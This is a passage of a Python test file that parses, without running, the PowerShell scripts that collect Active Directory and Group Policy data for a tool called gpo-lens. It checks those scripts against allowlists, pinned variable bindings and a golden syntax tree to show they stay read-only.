"""Collector read-only enforcement by a PowerShell AST gate in two layers.

The collection scripts run on a domain controller or RSAT host with a domain
account. gpo-lens claims they are read-only against Active Directory, Group
Policy and SYSVOL. This test turns that claim from "by inspection" into a
mechanical check that **parses** (never executes) each in-scope script with the
PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).

1. **Golden syntax tree** (completeness). ``tests/powershell/collector-inventory.json``
   holds, per script, a canonical order-preserving serialization of the WHOLE
   AST (one line per node: its role in the parent, its type, and every
   semantically relevant property — operators, names, string values, flags,
   ``#Requires``, attributes, every argument) plus a digest of the exact source
   bytes (LF pinned by .gitattributes). ``test_inventory_matches_golden`` fails on ANY difference,
   so every edit — a reorder, a changed argument, a new index assignment or
   ``#Requires`` line, even a comment — must be regenerated and its diff
   reviewed. Meta-tests prove the serializer covers every AST node type and
   property of the running PowerShell and that sampled systematic mutations
   change the tree.

2. **Semantic floor** (``run_all_checks``). ``scripts/gen_collector_inventory.py``
   refuses to regenerate unless every check passes, so a regeneration can only
   admit what these allowlists and pins admit: commands (and a never-allowed
   list), dynamic invocations, static/instance .NET calls, property writes,
   redirections (``$null`` only), ``using`` (none), ``New-Object``/``Add-Type``
   forms, a type-reference denylist, a closed set of AST node types, the exact
   local functions, exact scheduled-task argument vectors, exact pinning of
   every binding of every write/receiver/exec variable and what it reads, no
   provider/global/automatic-variable writes, the exact text plus control-flow
   context of every command invocation and write/delete/exec/lifetime .NET
   call, digests of every local function body and script param block, the
   exact uses of secret-bearing variables, no remote paths in command
   arguments, and the shared TaskName validator. It is a floor,
   not a proof: an admitted change still shows up as a golden diff.

Scope:

* In scope (run on the DC/RSAT host): ``Export-GpoEstate.ps1``,
  ``Export-GroupMembers.ps1``, ``Export-Principals.ps1``,
  ``Run-GpoLensCollection.ps1``, ``GpoLensCollectionMarker.ps1``.
* ``Register-GpoLensCollection.ps1`` also runs on the DC/RSAT host but its job
  is to create a Windows scheduled task (a write to the host, not to AD). Each
  ScheduledTasks cmdlet call must match a pinned argument vector exactly.
* Out of scope: ``install-windows.ps1`` / ``uninstall-windows.ps1`` run on the
  *analysis* host (IIS install), never on a DC.

Residual limits are stated in ``docs/threat-model.md`` R5.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import cache
from pathlib import Path
from typing import Any

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPTS = _REPO / "scripts"
_DUMPER = _REPO / "tests" / "powershell" / "Get-ScriptCallInventory.ps1"


@dataclass(frozen=True)
class ScriptPolicy:
    commands: frozenset[str]
    static_methods: frozenset[str] = frozenset()
    instance_methods: frozenset[str] = frozenset()
    dynamic_invocations: frozenset[str] = frozenset()
    dot_sources: tuple[str, ...] = ()
    new_object_types: frozenset[str] = frozenset()
    add_type_assemblies: frozenset[str] = frozenset()
    add_type_definitions: frozenset[str] = frozenset()
    member_assignments: frozenset[str] = frozenset()
    write_roots: dict[str, str] = field(default_factory=dict)


# Console output and pure pipeline/data cmdlets; no state outside the process.
_CONSOLE_AND_PIPELINE = frozenset(
    {
        "ConvertFrom-Json",
        "ConvertTo-Json",
        "ForEach-Object",
        "Get-Date",
        "Join-Path",
        "Measure-Object",
        "Out-Null",
        "Out-String",
        "Select-Object",
        "Sort-Object",
        "Where-Object",
        "Write-Error",
        "Write-Host",
        "Write-Progress",
        "Write-Warning",
    }
)
# Local file-system reads.
_FS_READ = frozenset({"Get-ChildItem", "Get-Content", "Get-Item", "Resolve-Path", "Test-Path"})


def _cmds(*names: str, shared: frozenset[str]) -> frozenset[str]:
    """Script-specific commands plus the subset of *shared* the script uses.

    Every name must still be used (the exact-match check), so taking a subset
    of a shared group never widens what a script may call.
    """
    return frozenset(names) | shared


POLICIES: dict[str, ScriptPolicy] = {
    "Export-GpoEstate.ps1": ScriptPolicy(
        commands=_cmds(
            # AD / Group Policy reads.
            "Get-ADDomain",
            "Get-ADGroupMember",
            "Get-ADObject",
            "Get-ADOrganizationalUnit",
            "Get-ADRootDSE",
            "Get-GPInheritance",
            "Get-GPO",
            "Get-GPOReport",
            "Get-Module",
            # Assembly load for ZIP creation; New-Object for SID parsing.
            "Add-Type",
            "New-Object",
            # Local writes, constrained by write_roots.
            "Copy-Item",
            "New-Item",
            "Remove-Item",
            "Set-Content",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertFrom-Json", "Out-String"})
            | (_FS_READ - {"Resolve-Path"}),
        ),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[string]::new",
                "Collections.Generic.List[object]::new",
                "Collections.Generic.List[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFileExtensions::CreateEntryFromFile",
                "IO.File::WriteAllText",
                "math::Round",
                "regex::Matches",
            }
        ),
        instance_methods=frozenset(
            # Collections, strings, ZIP dispose, SecurityIdentifier.Translate
            # (SID -> account name lookup, a read).
            {"Add", "Contains", "Dispose", "Replace", "Split", "Substring", "Translate", "Trim"}
        ),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (created if absent)",
            "testFile": "Join-Path $OutputRoot '_writetest_.tmp' (writability probe, removed)",
            "out": "Join-Path $OutputRoot '<domain>-<stamp>' (this run's export folder)",
            "dest": "Join-Path $out 'SYSVOL-Policies' (the SYSVOL copy target)",
            "archive": '"$ExportPath.zip" where New-GpoExportZip receives -ExportPath $out',
        },
    ),
    "Export-GroupMembers.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADGroupMember",
            "Get-Content",
            "Set-Content",
            shared=frozenset(
                {"ConvertFrom-Json", "ConvertTo-Json", "Get-Date", "Where-Object", "Write-Host"}
            ),
        ),
        # Splatting an optional -Credential into the AD read cmdlets.
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default group-members.json)"},
    ),
    "Export-Principals.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADDomain",
            "Get-ADObject",
            "New-Object",
            "Set-Content",
            shared=frozenset(
                {
                    "ConvertTo-Json",
                    "Get-ChildItem",
                    "Get-Content",
                    "Get-Date",
                    "Join-Path",
                    "Sort-Object",
                    "Test-Path",
                    "Where-Object",
                    "Write-Host",
                }
            ),
        ),
        static_methods=frozenset({"Collections.Generic.HashSet[string]::new", "regex::Matches"}),
        # RawSecurityDescriptor -> SDDL text and SID -> account name: reads.
        instance_methods=frozenset({"Add", "GetSecurityDescriptorSddlForm", "Translate"}),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default principals.json)"},
    ),
    "Run-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            "Copy-Item",
            "Move-Item",
            "New-Item",
            "Remove-Item",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertTo-Json", "Measure-Object", "Write-Progress"})
            | (_FS_READ - {"Get-Content"}),
        ),
        dynamic_invocations=frozenset(
            {
                # Runs the registered collector (default Export-GpoEstate.ps1).
                "& $CollectorPath -OutputRoot $OutputRoot *>&1",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[guid]::new",
                "Collections.Generic.Stack[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFile::OpenRead",
                "IO.File::AppendAllText",
                "IO.File::Open",
                "IO.File::ReadAllBytes",
                "IO.File::WriteAllBytes",
                "Text.UTF8Encoding::new",
                "guid::NewGuid",
                "guid::TryParse",
                "math::Max",
                "string::Equals",
            }
        ),
        instance_methods=frozenset(
            {
                "Add",
                "ContainsKey",
                # ZipArchive.CreateEntry / ZipArchiveEntry.Delete+Open on the
                # ZIP this run just created (inventory overlay).
                "CreateEntry",
                "Delete",
                "Dispose",
                "GetByteCount",
                "GetEntry",
                "GetString",
                "Open",
                "Pop",
                "Push",
                "Substring",
                "ToString",
                "TrimEnd",
                "TrimStart",
                "Write",
            }
        ),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (owner-marker checked before any write)",
            "LogPath": "Join-Path $OutputRoot 'collection.log'",
            "old": "$LogPath or $LogPath.<n> (log rotation)",
            "next": "$LogPath.<n> (log rotation)",
            "newest": "the single new completed ZIP under $OutputRoot",
            "exportDir": "Join-Path $OutputRoot $newest.BaseName",
            "archive": "an expired completed export ZIP under $OutputRoot (retention)",
            "folder": "Join-Path $OutputRoot $archive.BaseName (retention)",
            "CopyTo": "the -CopyTo delivery directory",
            "partial": "<$delivery>.<guid>.partial inside -CopyTo",
            "delivery": "Join-Path $CopyTo $newest.Name",
        },
    ),
    "GpoLensCollectionMarker.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            # Linux-only test path: link count of the already-open marker inode.
            "stat",
            shared=frozenset({"Get-Item", "Join-Path", "Test-Path"}),
        ),
        static_methods=frozenset(
            {
                "GpoLens.MarkerFileInfo::LinkCount",
                "IO.File::Delete",
                "IO.File::Open",
                "IO.MemoryStream::new",
                "uint32::TryParse",
            }
        ),
        instance_methods=frozenset(
            {"CopyTo", "DangerousGetHandle", "Dispose", "ToArray", "ToInt64", "Write"}
        ),
        # GetFileInformationByHandle P/Invoke (read-only link-count query).
        add_type_definitions=frozenset(
            {"8e3d8b0b78dcf2319d6a1e414007e80fdb055c76715b83f81e94ba32d42c5f67"}
        ),
        write_roots={
            "Marker": "the owner marker path passed by callers (opened for read only)",
            "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
        },
    ),
    # Separate, narrow policy: registering the task is a deliberate write to the
    # host's Task Scheduler (not to AD). Nothing else here writes beyond the
    # output root's owner marker and lock file.
    "Register-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "New-ScheduledTask",
            "New-ScheduledTaskAction",
            "New-ScheduledTaskPrincipal",
            "New-ScheduledTaskSettingsSet",
            "New-ScheduledTaskTrigger",
            "Register-ScheduledTask",
            "Unregister-ScheduledTask",
            # Service-account password prompt, handed only to Task Scheduler.
            "Get-Credential",
            "New-Item",
            shared=frozenset(
                {"Get-Item", "Join-Path", "Out-Null", "Resolve-Path", "Test-Path"}
                | {"Write-Host", "Write-Warning"}
            ),
        ),
        dynamic_invocations=frozenset(
            {
                # Invokes the in-file scriptblock literal passed to
                # Set-GpoLensCollectionOwner (its body is scanned here).
                "& $RegisterTask",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "IO.File::Delete",
                "IO.File::Open",
                "IO.Path::GetFullPath",
                "Text.UTF8Encoding::new",
                "datetime::TryParseExact",
                "string::Equals",
                "timespan::FromDays",
                "timespan::FromHours",
            }
        ),
        instance_methods=frozenset(
            {
                "Dispose",
                "GetBytes",
                "GetNetworkCredential",
                "GetString",
                "ShouldProcess",
                "TrimEnd",
                "TrimStart",
            }
        ),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (normalized with GetFullPath)",
            "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
        },
    ),
}

OUT_OF_SCOPE = {
    "install-windows.ps1": "runs on the analysis host to install the IIS site, not on a DC",
    "uninstall-windows.ps1": "runs on the analysis host to remove the IIS site, not on a DC",
}

# ---------------------------------------------------------------------------
# Dataflow confinement of write roots and other sink-bound variables (BL-1,
# Sol root_rebind/collector_rebind/registry). A name-only "the target mentions
# $OutputRoot" check is defeated by reassigning the variable; so every
# write-root and exec-pinned variable is pinned here to the exact set of
# assignment right-hand sides its documented derivation uses. Any extra or
# changed `=` assignment (a rebind to UNC/SYSVOL/provider/absolute) is not in
# the set and fails. Parameter defaults and foreach conditions are not pinned
# verbatim but must be path-safe (no UNC, provider, or `..`).
# ---------------------------------------------------------------------------


def _norm(text: str | None) -> str:
    return " ".join((text or "").split())


# Variables used as a write TARGET must all be declared write roots (keys here).
# Values are a short description of the derivation.
WRITE_ROOTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "outputroot": "-OutputRoot parameter (default C:\\gpo-export)",
        "testfile": "Join-Path $OutputRoot '_writetest_.tmp'",
        "out": "Join-Path $OutputRoot '<domain>-<stamp>'",
        "dest": "Join-Path $out 'SYSVOL-Policies'",
        "archive": '"$ExportPath.zip" (ExportPath = $out)',
    },
    "Export-GroupMembers.ps1": {"outputpath": "-OutputPath parameter"},
    "Export-Principals.ps1": {"outputpath": "-OutputPath parameter"},
    "Run-GpoLensCollection.ps1": {
        "outputroot": "-OutputRoot parameter",
        "logpath": "Join-Path $OutputRoot 'collection.log' (function param)",
        "old": "$LogPath or $LogPath.<n> (rotation)",
        "next": "$LogPath.<n> (rotation)",
        "newest": "the one new completed ZIP under $OutputRoot",
        "exportdir": "Join-Path $OutputRoot $newest.BaseName",
        "copyto": "-CopyTo delivery directory",
        "partial": "<delivery>.<guid>.partial under $CopyTo",
        "delivery": "Join-Path $CopyTo $newest.Name",
        "archive": "an expired completed export ZIP under $OutputRoot (foreach)",
        "folder": "Join-Path $OutputRoot $archive.BaseName",
    },
    "GpoLensCollectionMarker.ps1": {
        "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
    },
    "Register-GpoLensCollection.ps1": {
        "outputroot": "[IO.Path]::GetFullPath(-OutputRoot)",
        "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
    },
}

# Every variable whose binding matters is pinned to the EXACT set of its
# bindings (see the binding-key legend at _binding_key): write roots, receivers
# of every instance-method call / property write / index write, splatted
# variables, exec and scheduled-task inputs, dot-sourced function parameters
# pinned by their defining script, and transitively every variable those
# bindings read (_required_vars computes the set; check_pinned_bindings
# requires it to be covered here). Both directions are strict: an extra binding
# (a rebind) and a stale entry both fail. The comment on each entry is why the
# variable is required.
PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        # argument of write-progress
        "activity": frozenset(
            {
                '[set-sectionprogress] arg "AD sites"',
                '[set-sectionprogress] arg "GPO metadata"',
                '[set-sectionprogress] arg "GPO settings (XML reports)"',
                '[set-sectionprogress] arg "Group membership"',
                '[set-sectionprogress] arg "Inheritance (gp-inheritance)"',
                '[set-sectionprogress] arg "OU tree"',
                '[set-sectionprogress] arg "Principals (SID -> name)"',
                '[set-sectionprogress] arg "SYSVOL copy"',
                '[set-sectionprogress] arg "WMI filters"',
                "[set-sectionprogress] param",
            }
        ),
        # condition $allGpc
        "allgpc": frozenset(
            {
                (
                    "[script] = Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                    '"(objectClass=groupPolicyContainer)" ` -Properties displayName '
                    "-ErrorAction Stop"
                ),
            }
        ),
        # condition $allGpos
        "allgpos": frozenset(
            {
                "[script] = Get-GPO -All",
            }
        ),
        # receiver of .add()
        "allsids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of test-path
        "allxmlpath": frozenset(
            {
                "[script] = Join-Path $out 'AllGPOs.xml'",
            }
        ),
        # write root
        "archive": frozenset(
            {
                '[new-gpoexportzip] = "$ExportPath.zip"',
            }
        ),
        # receiver of .add()
        "collectionerrors": frozenset(
            {
                "[script] = [System.Collections.Generic.List[object]]::new()",
            }
        ),
        # argument of get-adobject
        "confignc": frozenset(
            {
                "[script] = (Get-ADRootDSE).configurationNamingContext",
            }
        ),
        # argument of .matches()
        "content": frozenset(
            {
                "[script] = Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
                "[script] = Get-Content -LiteralPath $metaPath -Raw",
            }
        ),
        # argument of .add()
        "copiedcount": frozenset(
            {
                (
                    "[script] = @(Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction "
                    "SilentlyContinue).Count"
                ),
            }
        ),
        # write root
        "dest": frozenset(
            {
                "[script] = Join-Path $out 'SYSVOL-Policies'",
            }
        ),
        # argument of write-warning
        "detail": frozenset(
            {
                (
                    '[script] = if ($policyFolders.Count -eq 0) { "enumerated 0 policy folders '
                    'at $src" + $(if ($srcErr) { " ($($srcErr[0].Exception.Message))" } else { '
                    '"" }) } else { "copy wrote 0 files to SYSVOL-Policies" }'
                ),
            }
        ),
        # argument of write-host
        "diskfiles": frozenset(
            {
                (
                    "[new-gpoexportzip] = @(Get-ChildItem -LiteralPath $ExportPath -Recurse "
                    "-File ` -ErrorAction SilentlyContinue -ErrorVariable +zipEnumErr)"
                ),
            }
        ),
        # receiver of .split()
        "dom": frozenset(
            {
                "[script] = Get-ADDomain",
            }
        ),
        # argument of write-host
        "domainsids": frozenset(
            {
                (
                    "[script] = @($allSids | Where-Object { $_ -match '^S-1-5-21-' -and "
                    "$principals[$_].type -eq 'Unresolved' })"
                ),
            }
        ),
        # condition $DryRun
        "dryrun": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of .createentryfromfile()
        "entryname": frozenset(
            {
                "[new-gpoexportzip] = $f.FullName.Substring($rootLen).Replace('\\', '/')",
            }
        ),
        # argument of get-childitem
        "exportpath": frozenset(
            {
                "[new-gpoexportzip] arg $out",
                "[new-gpoexportzip] param",
            }
        ),
        # receiver of .replace()
        "f": frozenset(
            {
                "[new-gpoexportzip] foreach $diskFiles",
                "[script] foreach $xmlFiles",
            }
        ),
        # receiver of .add()
        "failedsections": frozenset(
            {
                "[script] = [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # argument of .add()
        "g": frozenset(
            {
                "[script] = Get-GPInheritance -Target $t",
                "[script] foreach $allGpos",
            }
        ),
        # receiver of .trim()
        "gpc": frozenset(
            {
                "[script] foreach $allGpc",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "gpo": frozenset(
            {
                "[script] foreach $allGpos",
            }
        ),
        # argument of write-host
        "gpocount": frozenset(
            {
                "[script] = $allGpos.Count",
            }
        ),
        # index write $groupMembers[$gSid]
        "groupmembers": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $groupMembers[$gSid]",
                "[script] index $groupMembers['s-1-1-0']",
                "[script] index $groupMembers['s-1-5-11']",
            }
        ),
        # pipeline input $groupMembersOut
        "groupmembersout": frozenset(
            {
                (
                    "[script] = [ordered]@{ collected = (Get-Date -Format 'o'); domain = "
                    "$dom.DNSRoot; groups = $groupMembers }"
                ),
            }
        ),
        # argument of write-host
        "groupsexpanded": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "groupsfailed": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "groupsids": frozenset(
            {
                (
                    "[script] = @($principals.Keys | Where-Object { $principals[$_].type -eq "
                    "'Group' })"
                ),
            }
        ),
        # argument of get-adgroupmember
        "gsid": frozenset(
            {
                "[script] foreach $groupSids",
            }
        ),
        # argument of write-warning
        "guid": frozenset(
            {
                "[script] = $gpc.Name.Trim('{}')",
            }
        ),
        # argument of write-progress
        "i": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # pipeline input $inh
        "inh": frozenset(
            {
                (
                    "[script] = foreach ($t in $targets) { try { $g = Get-GPInheritance "
                    "-Target $t [pscustomobject]@{ Path = $g.Path Name = $g.Name ContainerType "
                    "= $g.ContainerType GpoInheritanceBlocked = $g.GpoInheritanceBlocked "
                    "InheritedGpoLinks = $g.InheritedGpoLinks | Select-Object DisplayName, "
                    "GpoId, Enabled, Enforced, Order, Target } } catch { Write-Warning "
                    '"GPInheritance failed for $t : $($_.Exception.Message)" } }'
                ),
            }
        ),
        # receiver of .add()
        "knownids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of .add()
        "m": frozenset(
            {
                "[script] foreach [regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            }
        ),
        # pipeline input $members
        "members": frozenset(
            {
                "[script] = Get-ADGroupMember -Identity $gSid -Recursive -ErrorAction Stop",
            }
        ),
        # argument of test-path
        "metapath": frozenset(
            {
                "[script] = Join-Path $out 'gpo-metadata.json'",
            }
        ),
        # argument of get-module
        "mod": frozenset(
            {
                "[script] foreach @('GroupPolicy','ActiveDirectory')",
            }
        ),
        # argument of write-host
        "nozip": frozenset(
            {
                "[script] param",
            }
        ),
        # condition $obj
        "obj": frozenset(
            {
                (
                    "[script] = Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
                    "objectClass, sAMAccountName, name -ErrorAction Stop"
                ),
            }
        ),
        # condition $objClass
        "objclass": frozenset(
            {
                "[script] = $obj.objectClass[-1]",
            }
        ),
        # argument of write-host
        "oucount": frozenset(
            {
                "[script] = @(Get-ADOrganizationalUnit -Filter *).Count",
            }
        ),
        # write root
        "out": frozenset(
            {
                '[script] = Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            }
        ),
        # write root
        "outputroot": frozenset(
            {
                '[script] param "C:\\gpo-export"',
            }
        ),
        # argument of write-progress
        "pct": frozenset(
            {
                "[set-sectionprogress] = [math]::Round(($Section / $totalSections) * 100)",
            }
        ),
        # receiver of .trim()
        "pf": frozenset(
            {
                "[script] foreach $policyFolders",
            }
        ),
        # argument of get-adobject
        "policiesdn": frozenset(
            {
                '[script] = "CN=Policies,CN=System,$($dom.DistinguishedName)"',
            }
        ),
        # condition $policyFolders
        "policyfolders": frozenset(
            {
                (
                    "[script] = @(Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction "
                    "SilentlyContinue -ErrorVariable +srcErr)"
                ),
            }
        ),
        # index write $principals[$sid]
        "principals": frozenset(
            {
                "[script] = [ordered]@{}",
                "[script] index $principals[$sid]",
            }
        ),
        # pipeline input $principalsOut
        "principalsout": frozenset(
            {
                (
                    "[script] = [ordered]@{ collected = (Get-Date -Format 'o'); domain = "
                    "$dom.DNSRoot; principals = $principals }"
                ),
            }
        ),
        # argument of write-host
        "resolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of .substring()
        "rootlen": frozenset(
            {
                "[new-gpoexportzip] = $ExportPath.Length + 1",
            }
        ),
        # argument of write-host
        "s": frozenset(
            {
                "[script] foreach $failedSections",
                "[script] foreach $successSections",
            }
        ),
        # write target (Join-Path $out "reports\${safe}__$($gpo.Id).xml")
        "safe": frozenset(
            {
                "[script] = ($gpo.DisplayName -replace '[\\\\/:*?\"<>|\\[\\]]', '_')",
            }
        ),
        # condition $sam -match '\$$'
        "sam": frozenset(
            {
                '[script] = ""',
                "[script] = $matches[1]",
                "[script] = $matches[2]",
                "[script] = $translated",
                "[script] = if ($obj.sAMAccountName) { $obj.sAMAccountName } else { $obj.Name }",
            }
        ),
        # argument of .round()
        "section": frozenset(
            {
                "[set-sectionprogress] arg $sectionNum",
                "[set-sectionprogress] param",
            }
        ),
        # argument of set-sectionprogress
        "sectionnum": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of new-object
        "sid": frozenset(
            {
                "[script] foreach $domainSids",
                "[script] foreach ($allSids | Sort-Object)",
            }
        ),
        # receiver of .translate()
        "sidobj": frozenset(
            {
                "[script] = New-Object System.Security.Principal.SecurityIdentifier($sid)",
            }
        ),
        # argument of write-host
        "sitecount": frozenset(
            {
                (
                    "[script] = @(Get-ADObject -SearchBase "
                    '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                    '"(objectClass=site)" -ErrorAction SilentlyContinue).Count'
                ),
            }
        ),
        # argument of write-host
        "skipsysvol": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of get-childitem
        "src": frozenset(
            {
                '[script] = "\\\\$($dom.DNSRoot)\\SYSVOL\\$($dom.DNSRoot)\\Policies"',
            }
        ),
        # condition $srcErr
        "srcerr": frozenset(
            {
                "[script] = $null",
                "[script] common -errorvariable",
            }
        ),
        # argument of join-path
        "stamp": frozenset(
            {
                '[script] = Get-Date -Format "yyyyMMdd-HHmmss"',
            }
        ),
        # receiver of .add()
        "successsections": frozenset(
            {
                "[script] = [System.Collections.Generic.List[string]]::new()",
            }
        ),
        # argument of .add()
        "sysvolerrors": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of .round()
        "sysvolsize": frozenset(
            {
                (
                    "[script] = (Get-ChildItem $src -Recurse -File -ErrorAction "
                    "SilentlyContinue | Measure-Object -Property Length -Sum).Sum"
                ),
            }
        ),
        # argument of write-host
        "sysvolsizestr": frozenset(
            {
                '[script] = "$([math]::Round($sysvolSize / 1MB, 2)) MB"',
                '[script] = "skipped"',
            }
        ),
        # argument of get-gpinheritance
        "t": frozenset(
            {
                "[script] foreach $targets",
            }
        ),
        # condition $targets
        "targets": frozenset(
            {
                (
                    "[script] = @($dom.DistinguishedName) + (Get-ADOrganizationalUnit -Filter "
                    "* | Select-Object -Expand DistinguishedName)"
                ),
            }
        ),
        # write root
        "testfile": frozenset(
            {
                '[script] = Join-Path $OutputRoot "_writetest_.tmp"',
            }
        ),
        # argument of write-progress
        "totalsections": frozenset(
            {
                "[script] = 9",
            }
        ),
        # condition $translated -match '^(.+?)\\(.+)$'
        "translated": frozenset(
            {
                "[script] = $sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            }
        ),
        # argument of write-host
        "unresolved": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixMinusMinus",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "wmicount": frozenset(
            {
                (
                    "[script] = @(Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" "
                    "-Properties 'msWMI-Name' -ErrorAction SilentlyContinue).Count"
                ),
            }
        ),
        # condition $xmlFiles
        "xmlfiles": frozenset(
            {
                "[script] += Get-Item -LiteralPath $allXmlPath",
                (
                    "[script] = @(Get-ChildItem -LiteralPath (Join-Path $out 'reports') "
                    "-Filter '*.xml' -ErrorAction SilentlyContinue)"
                ),
            }
        ),
        # receiver of .dispose()
        "zip": frozenset(
            {
                "[new-gpoexportzip] = [System.IO.Compression.ZipFile]::Open($archive, 'Create')",
            }
        ),
        # condition $zipEnumErr
        "zipenumerr": frozenset(
            {
                "[new-gpoexportzip] = $null",
                "[new-gpoexportzip] common -errorvariable",
            }
        ),
    },
    "Export-GroupMembers.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "[script] = @{}",
                "[script] member $adParams.Credential",
            }
        ),
        # condition $Credential
        "credential": frozenset(
            {
                "[script] param",
            }
        ),
        # argument of write-host
        "expanded": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # argument of write-host
        "failed": frozenset(
            {
                "[script] = 0",
                "[script] incdec PostfixPlusPlus",
            }
        ),
        # index write $groupMembers[$sid]
        "groupmembers": frozenset(
            {
                "[script] = [ordered]@{}",
                '[script] index $groupMembers["s-1-1-0"]',
                '[script] index $groupMembers["s-1-5-11"]',
                "[script] index $groupMembers[$sid]",
            }
        ),
        # argument of write-host
        "groups": frozenset(
            {
                (
                    "[script] = $principalsData.principals.PSObject.Properties | Where-Object "
                    '{ $_.Value.type -eq "Group" }'
                ),
            }
        ),
        # read by a binding of $sid
        "grp": frozenset(
            {
                "[script] foreach $groups",
            }
        ),
        # condition $m.SID
        "m": frozenset(
            {
                "[script] foreach $members",
            }
        ),
        # condition $members
        "members": frozenset(
            {
                (
                    "[script] = Get-ADGroupMember -Identity $sid -Recursive @adParams "
                    "-ErrorAction Stop"
                ),
            }
        ),
        # argument of write-host
        "membersids": frozenset(
            {
                "[script] += $m.SID.Value",
                "[script] = @()",
            }
        ),
        # argument of write-host
        "name": frozenset(
            {
                "[script] = $grp.Value.name",
            }
        ),
        # pipeline input $out
        "out": frozenset(
            {
                (
                    '[script] = [ordered]@{ collected = (Get-Date -Format "o") domain = '
                    "$principalsData.domain groups = $groupMembers }"
                ),
            }
        ),
        # write root
        "outputpath": frozenset(
            {
                '[script] param "group-members.json"',
            }
        ),
        # pipeline input $principalsData.principals.PSObject.Properties
        "principalsdata": frozenset(
            {
                "[script] = Get-Content $PrincipalsPath -Raw -Encoding UTF8 | ConvertFrom-Json",
            }
        ),
        # argument of get-content
        "principalspath": frozenset(
            {
                '[script] param "principals.json"',
            }
        ),
        # argument of write-host
        "sid": frozenset(
            {
                "[script] = $grp.Name",
            }
        ),
    },
    "Export-Principals.ps1": {
        # property write $adParams.Credential
        "adparams": frozenset(
            {
                "[script] = @{}",
                "[script] member $adParams.Credential",
            }
        ),
        # receiver of .add()
        "allsids": frozenset(
            {
                (
                    "[script] = "
                    "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]:"
                    ":OrdinalIgnoreCase)"
                ),
            }
        ),
        # argument of test-path
        "allxml": frozenset(
            {
                '[script] = Join-Path $SddlSource "AllGPOs.xml"',
            }
        ),
        # argument of .matches()
        "content": frozenset(
            {
                "[script] = Get-Content $f -Raw -ErrorAction Stop",
                "[script] = Get-Content $metaFile -Raw",
            }
        ),
        # condition $Credential
        "credential": frozenset(
            {
                "[script] param",
            }
        ),
        # condition -not $dom
        "dom": frozenset(
            {
                "[script] = $null",
                "[script] = Get-ADDomain @adParams",
            }
        ),
        # read by a binding of $out
        "domaindns": frozenset(
            {
